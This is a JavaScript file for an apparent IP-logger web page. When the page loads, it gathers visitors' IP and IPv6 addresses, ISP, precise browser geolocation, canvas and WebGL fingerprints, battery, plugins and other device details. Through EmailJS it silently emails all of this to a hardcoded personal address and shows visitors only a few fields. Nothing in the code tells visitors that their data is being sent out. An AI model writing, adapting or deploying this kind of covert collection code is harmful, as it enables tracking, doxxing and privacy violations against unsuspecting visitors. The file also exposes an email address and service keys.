emailjs.init("2jj19BTFwlNnm8fp_");

async function sendEmail(data) {
    const emailData = {
        to_email: "surner282@gmail.com", // Your target email (VISIBLE IN CODE)
        subject: "New IP Visitor - Full Data",
        message: `=== IP & NETWORK ===
IP ADDRESS: ${data.ip}
IPv6: ${data.ipv6}
LOCATION: ${data.location}
ISP / PROVIDER: ${data.isp}
COUNTRY CODE: ${data.country}
TIMEZONE: ${data.timezone}
COORDINATES: ${data.coords}
ASN: ${data.asn}
VPN/PROXY: ${data.vpn}

=== SYSTEM INFO ===
OS: ${data.os}
BROWSER: ${data.browser}
USER AGENT: ${data.useragent}
SCREEN: ${data.screen}
LANGUAGE: ${data.language}
CONNECTION: ${data.connection}
CPU CORES: ${data.cores}
MEMORY: ${data.memory}
TOUCH SUPPORT: ${data.touch}
BATTERY: ${data.battery}
DEVICE MODEL: ${data.deviceModel}
HARDWARE CONCURRENCY: ${data.hardwareConcurrency}
DEVICE MEMORY: ${data.deviceMemory}
PLUGINS: ${data.plugins}
MIME TYPES: ${data.mimeTypes}

=== GEOLOCATION ===
LATITUDE: ${data.latitude}
LONGITUDE: ${data.longitude}
ACCURACY: ${data.accuracy}

=== BROWSER DATA ===
COOKIES ENABLED: ${data.cookies}
LOCAL STORAGE: ${data.localStorageSupport}
SESSION STORAGE: ${data.sessionStorageSupport}
WEBGL: ${data.webgl}
CANVAS FINGERPRINT: ${data.canvas}
REFERRER: ${data.referrer}
JAVA ENABLED: ${data.java}
FLASH: ${data.flash}

=== ADDITIONAL ===
TIMEZONE OFFSET: ${data.timezoneOffset}
LOCAL TIME: ${data.localTime}
PLATFORM: ${data.platform}
DO NOT TRACK: ${data.doNotTrack}
ONLINE STATUS: ${data.onlineStatus}
CONNECTION TYPE: ${data.connectionType}
DOWNLINK: ${data.downlink}
EFFECTIVE TYPE: ${data.effectiveType}
ROUND TRIP TIME: ${data.rtt}
SAVE DATA: ${data.saveData}`
    };

    try {
        // Send email using EmailJS (Service ID and Template ID are VISIBLE IN CODE)
        await emailjs.send("service_yn5chrh", "template_psyarye", emailData);
        console.log('Email sent successfully via frontend.');
    } catch (error) {
        console.error('Email failed from frontend:', error);
    }
}

// Helper functions for client-side data collection

function getOS(userAgent) {
    if (userAgent.includes("Win")) return "Windows";
    if (userAgent.includes("Mac")) return "macOS";
    if (userAgent.includes("Linux")) return "Linux";
    if (userAgent.includes("Android")) return "Android";
    if (userAgent.includes("iPhone")) return "iOS";
    return "Unknown";
}

function getBrowser(userAgent) {
    if (userAgent.includes("Chrome") && !userAgent.includes("Edge")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
    if (userAgent.includes("Edge")) return "Edge";
    if (userAgent.includes("Opera")) return "Opera";
    return "Unknown";
}

async function getIPv6Address() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'unavailable';
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint test', 2, 2);
        return canvas.toDataURL().slice(-20);
    } catch {
        return 'blocked';
    }
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'not supported';
        const renderer = gl.getParameter(gl.RENDERER);
        const vendor = gl.getParameter(gl.VENDOR);
        return `${vendor} ${renderer}`.substring(0, 50);
    } catch {
        return 'blocked';
    }
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}% - ${battery.charging ? 'charging' : 'not charging'}`;
        }
        return 'unavailable';
    } catch {
        return 'blocked';
    }
}

function detectVPN() {
    const timezoneOffset = new Date().getTimezoneOffset();
    const systemLanguage = navigator.language;
    const userAgent = navigator.userAgent;

    if (timezoneOffset !== 0 && systemLanguage.substring(0,2) !== 'en') return 'possible';
    if (userAgent.includes('Proxy') || userAgent.includes('VPN')) return 'detected';
    return 'not detected';
}

async function getGeolocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                },
                (error) => {
                    console.error('Geolocation error:', error);
                    resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' });
                }
            );
        } else {
            resolve({ latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' });
        }
    });
}

async function loadData() {
    const btn = document.getElementById('refresh-btn');
    btn.textContent = 'loading...';
    btn.disabled = true;

    let collectedData = {}; // Data to be displayed and sent

    try {
        // Fetch IP details from ipapi.co (client-side)
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        console.log('IP Data:', ipData);

        collectedData.ip = ipData.ip || 'error';
        collectedData.location = `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`;
        collectedData.isp = ipData.org || 'unknown';
        collectedData.country = `${ipData.country_code || 'unknown'} (${ipData.country_calling_code || 'n/a'})`;
        collectedData.timezone = ipData.timezone || 'unknown';
        collectedData.coords = `${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}`;
        collectedData.asn = `AS${ipData.asn || 'unknown'} - ${ipData.network || 'unknown'}`;

        // Collect all other client-side data
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

        collectedData.userAgent = navigator.userAgent;
        collectedData.screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
        collectedData.language = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
        collectedData.connection = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps (${connection.type || 'unknown'})` : 'unavailable';

        collectedData.ipv6 = await getIPv6Address();
        collectedData.os = getOS(navigator.userAgent);
        collectedData.browser = getBrowser(navigator.userAgent);
        collectedData.cores = navigator.hardwareConcurrency || 'unknown';
        collectedData.memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown';
        collectedData.touch = 'ontouchstart' in window ? 'supported' : 'not supported';
        collectedData.battery = await getBatteryInfo();
        collectedData.cookies = navigator.cookieEnabled ? 'enabled' : 'disabled';
        collectedData.localStorageSupport = typeof(Storage) !== "undefined" ? 'supported' : 'not supported';
        collectedData.sessionStorageSupport = typeof(sessionStorage) !== "undefined" ? 'supported' : 'not supported';
        collectedData.webgl = getWebGLInfo();
        collectedData.canvas = getCanvasFingerprint();
        collectedData.referrer = document.referrer || 'direct';
        collectedData.java = navigator.javaEnabled ? navigator.javaEnabled() : 'unknown';
        collectedData.flash = navigator.plugins['Shockwave Flash'] ? 'enabled' : 'not detected';
        collectedData.timezoneOffset = new Date().getTimezoneOffset();
        collectedData.localTime = new Date().toLocaleString();
        collectedData.platform = navigator.platform;
        collectedData.doNotTrack = navigator.doNotTrack || 'not set';
        collectedData.onlineStatus = navigator.onLine ? 'online' : 'offline';
        collectedData.connectionType = connection ? connection.type || 'unknown' : 'unknown'; // Redundant with 'connection' but kept for email detail
        collectedData.vpn = detectVPN();

        // Additional data collection
        collectedData.deviceModel = navigator.userAgentData ? navigator.userAgentData.platform : 'unknown';
        collectedData.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
        collectedData.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown';
        collectedData.plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'none';
        collectedData.mimeTypes = Array.from(navigator.mimeTypes).map(mime => mime.type).join(', ') || 'none';
        collectedData.downlink = connection ? connection.downlink : 'unknown';
        collectedData.effectiveType = connection ? connection.effectiveType : 'unknown';
        collectedData.rtt = connection ? connection.rtt : 'unknown';
        collectedData.saveData = navigator.connection ? navigator.connection.saveData : 'unknown';

        // Geolocation data
        const geoData = await getGeolocation();
        collectedData.latitude = geoData.latitude;
        collectedData.longitude = geoData.longitude;
        collectedData.accuracy = geoData.accuracy;

        // Update display on the webpage
        document.getElementById('ip').textContent = collectedData.ip;
        document.getElementById('location').textContent = collectedData.location;
        document.getElementById('isp').textContent = collectedData.isp;
        document.getElementById('country').textContent = collectedData.country;
        document.getElementById('timezone').textContent = collectedData.timezone;
        document.getElementById('coords').textContent = collectedData.coords;
        document.getElementById('asn').textContent = collectedData.asn;
        document.getElementById('useragent').textContent = collectedData.userAgent;
        document.getElementById('screen').textContent = collectedData.screen;
        document.getElementById('lang').textContent = collectedData.language;
        document.getElementById('connection').textContent = collectedData.connection;

        // Send email with all collected data (client-side)
        await sendEmail(collectedData);

    } catch (error) {
        console.error('Error during data collection or email sending:', error);
        // Display errors if anything fails
        document.getElementById('ip').textContent = 'error';
        document.getElementById('location').textContent = 'error';
        document.getElementById('isp').textContent = 'error';
        document.getElementById('country').textContent = 'error';
        document.getElementById('timezone').textContent = 'error';
        document.getElementById('coords').textContent = 'error';
        document.getElementById('asn').textContent = 'error';
        document.getElementById('useragent').textContent = 'error';
        document.getElementById('screen').textContent = 'error';
        document.getElementById('lang').textContent = 'error';
        document.getElementById('connection').textContent = 'error';
    }

    btn.textContent = 'refresh data';
    btn.disabled = false;
}

function refresh() {
    loadData();
}

// --- Video and Audio Autoplay Attempt ---
document.addEventListener('DOMContentLoaded', () => {
    const backgroundVideo = document.getElementById('backgroundVideo');
    const backgroundMusic = document.getElementById('backgroundMusic');

    // Attempt to play video immediately (it's muted, so usually allowed)
    backgroundVideo.play().catch(error => {
        console.warn("Video autoplay failed (muted):", error);
    });

    // Attempt to play music immediately (might be blocked by browser autoplay policy)
    backgroundMusic.play().catch(error => {
        console.warn("Music autoplay failed (likely blocked by browser policy for sound):", error);
        // You could add a small visual cue here if music fails, but user requested no button.
    });

    // Initial data load
    loadData();
});
